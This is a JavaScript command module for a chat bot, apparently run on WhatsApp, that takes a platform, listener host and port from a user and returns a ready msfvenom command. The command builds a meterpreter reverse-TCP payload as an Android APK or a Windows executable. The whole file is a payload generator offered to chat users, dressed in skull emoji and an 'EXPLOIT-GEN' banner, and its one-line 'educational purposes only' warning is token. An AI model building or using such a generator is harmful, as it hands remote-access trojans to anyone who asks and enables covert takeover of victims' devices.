// VEX MINI BOT - VEX: payload
// Nova: Generates exploit blueprints for security research.
// Dev: Lupin Starnley

module.exports = {
    vex: 'payload',
    cyro: 'hacks',
    nova: 'Generates Metasploit-style payload blueprints.',

    async execute(m, sock) {
        const args = m.text.trim().split(/ +/).slice(1);
        const type = args[0]?.toLowerCase();
        const lhost = args[1] || "127.0.0.1";
        const lport = args[2] || "4444";

        if (!type) return m.reply("❌ *USAGE:* `.payload [android/win] [LHOST] [LPORT]`");

        await sock.sendMessage(m.key.remoteJid, { react: { text: "💀", key: m.key } });

        let command = "";
        if (type === 'android') {
            command = `msfvenom -p android/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} R > /sdcard/v-node.apk`;
        } else if (type === 'win') {
            command = `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe > /sdcard/v-node.exe`;
        } else {
            return m.reply("❌ *INVALID TYPE:* Choose 'android' or 'win'.");
        }

        let payMsg = `╭━━━〔 💀 *VEX: EXPLOIT-GEN* 〕━━━╮\n`;
        payMsg += `┃ 🌟 *Status:* Payload Ready\n`;
        payMsg += `┃ 🧬 *Platform:* ${type.toUpperCase()}\n`;
        payMsg += `┃ 📡 *LHOST:* ${lhost}\n`;
        payMsg += `┃ 🔌 *LPORT:* ${lport}\n`;
        payMsg += `╰━━━━━━━━━━━━━━━━━━━━╯\n\n`;

        payMsg += `*🛠️ TERMINAL COMMAND:*\n`;
        payMsg += `\`\`\`${command}\`\`\`\n\n`;

        payMsg += `*⚠️ SECURITY WARNING:*\n`;
        payMsg += `> "This blueprint is for educational purposes only. Unauthorized access to systems is illegal. Use within your private network."\n\n`;
        payMsg += `_VEX MINI BOT: Privacy is Power_`;

        await sock.sendMessage(m.chat, { text: payMsg }, { quoted: m });
    }
};